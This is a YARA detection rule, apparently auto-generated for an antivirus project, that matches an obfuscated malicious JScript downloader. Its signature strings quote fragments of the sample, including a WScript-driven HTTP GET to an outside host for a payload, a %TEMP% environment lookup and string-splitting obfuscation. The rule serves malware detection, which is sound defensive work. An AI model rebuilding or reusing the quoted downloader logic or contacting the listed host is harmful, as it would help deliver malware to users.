rule sig_20160428_129c96bba124eabd30d75a4de30347c7 {
  meta:
    description = "datamaliciousorder - file 20160428_129c96bba124eabd30d75a4de30347c7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "eec5167639944ff0a7efd46067b9e398ba4e12c489cc1665ac84f27fb25a51d7"

  strings:
    $s1  = "QzlFftIwyCrnUkbKbzMod[TqdEyoFgnOmxZihGoxFfy](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function VumUpxTpgLfdEsfTbaVba(RalGnaZekIauBmzJujJjf){IiyPrrXakFzaBrdFigRmt[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function VumUpxTpgLfdEsfTbaVba(RalGnaZekIauBmzJujJjf){IiyPrrXakFzaBrdFigRmt[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function BwuRxuCkhSqnXsvQrfPor() {return IiyPrrXakFzaBrdFigRmt[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "var IiyPrrXakFzaBrdFigRmt = function CjbNjiHiwKxuWxiXufRnc() {return KyzXghSkqZbnXnsTtxTkp[JycVfiDidHneYqnBvcPvo](\"WScript\"+\"" ascii
    $s6  = "return OkgDxfAhrQhsZdeEolQfn - VosRduVuhEpwHtiGvwAao;};" fullword ascii
    $s7  = "function WuwFarRpoMeeIwaQgsXxw(OkgDxfAhrQhsZdeEolQfn, VosRduVuhEpwHtiGvwAao){OusGngDvqVbbWzjZuwBxn = OusGngDvqVbbWzjZuwBxn * 1; " ascii
    $s8  = "var KyzXghSkqZbnXnsTtxTkp = this[\"WScript\"];" fullword ascii
    $s9  = "var IiyPrrXakFzaBrdFigRmt = function CjbNjiHiwKxuWxiXufRnc() {return KyzXghSkqZbnXnsTtxTkp[JycVfiDidHneYqnBvcPvo](\"WScript\"+\"" ascii
    $s10 = "function BwuRxuCkhSqnXsvQrfPor() {return IiyPrrXakFzaBrdFigRmt[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function SuvDdvBofMjwTgjJmpRed(){return XwdLbfPycRmkQkvEktBpa + \"\";};" fullword ascii
    $s12 = "if (QzlFftIwyCrnUkbKbzMod[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function WuwFarRpoMeeIwaQgsXxw(OkgDxfAhrQhsZdeEolQfn, VosRduVuhEpwHtiGvwAao){OusGngDvqVbbWzjZuwBxn = OusGngDvqVbbWzjZuwBxn * 1; " ascii
    $s14 = "function QyuGbdKoxFmhShpAgmOgt() {return ((ApeTuoGuyJwoNtdPxiPdi == true) && (ApeTuoGuyJwoNtdPxiPdi == LgzNrcWkwGgbDwoWpxJpz)) ?" ascii
    $s15 = "function QyuGbdKoxFmhShpAgmOgt() {return ((ApeTuoGuyJwoNtdPxiPdi == true) && (ApeTuoGuyJwoNtdPxiPdi == LgzNrcWkwGgbDwoWpxJpz)) ?" ascii
    $s16 = "function BzjSieElmWlaTwpEiqFpu(LyxOfkNznDygNxiWyfZkv) {var AbmPveAmdWvyUahRjaOoc = (1, 2, 3, 4, 5, LyxOfkNznDygNxiWyfZkv); retur" ascii
    $s17 = "}while (RmzTfwRzhAsfMubKjnNpp);" fullword ascii
    $s18 = "function BzjSieElmWlaTwpEiqFpu(LyxOfkNznDygNxiWyfZkv) {var AbmPveAmdWvyUahRjaOoc = (1, 2, 3, 4, 5, LyxOfkNznDygNxiWyfZkv); retur" ascii
    $s19 = "return WuwFarRpoMeeIwaQgsXxw(1 == 1 ? VxoJyoXqlIvzUjjAjvHjw : 0, 1 == 1 ? IooVmrMsxUrxGprAdzIsx : 0);" fullword ascii
    $s20 = "ApeTuoGuyJwoNtdPxiPdi = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}